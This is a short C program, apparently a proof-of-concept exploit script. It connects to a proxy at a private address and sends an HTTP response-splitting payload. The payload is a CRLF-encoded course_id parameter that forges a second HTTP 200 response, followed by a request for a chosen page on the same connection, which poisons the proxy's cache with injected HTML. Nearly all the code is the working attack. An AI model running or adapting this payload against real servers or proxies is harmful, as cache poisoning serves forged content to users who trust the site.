#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define PROXY_IP "192.168.1.202"
#define PROXY_PORT 8080
#define BUFFER_SIZE 4096

// Create socket connection
int create_connection() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return -1;
    }

    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(PROXY_PORT);

    if (inet_pton(AF_INET, PROXY_IP, &proxy_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

int send_splitting_attack(int sock) {

    // First request with response splitting payload
    const char* first_request =
            "GET /cgi-bin/course_selector?course_id=67607%0d%0aContent-Length:"
            "%200%0d%0aConnection:%20Keep-Alive%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:"
            "%20text/html%0d%0aLast-Modified:%20Thu,%2010%20Jan%202025%2013:02:36%20GMT%0d%0a"
            "Content-Length:%2022%0d%0a%0d%0a<HTML>322314303</HTML> HTTP/1.1\r\n"
            "Host: 192.168.1.202:8080\r\n"
            "\r\n";

    // Second request - sent immediately on the same connection
    const char* second_request =
            "GET /67607.html HTTP/1.1\r\n"
            "Host: 192.168.1.202:8080\r\n"
            "Connection: close\r\n"
            "\r\n";

    // Send first request
    if (send(sock, first_request, strlen(first_request), 0) < 0) {
        return -1;
    }

    // Send second request immediately
    if (send(sock, second_request, strlen(second_request), 0) < 0) {
        return -1;
    }

    return 0;
}

int main() {
    int sock = create_connection();
    if (sock < 0) {
        return 1;
    }

    if (send_splitting_attack(sock) < 0) {
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}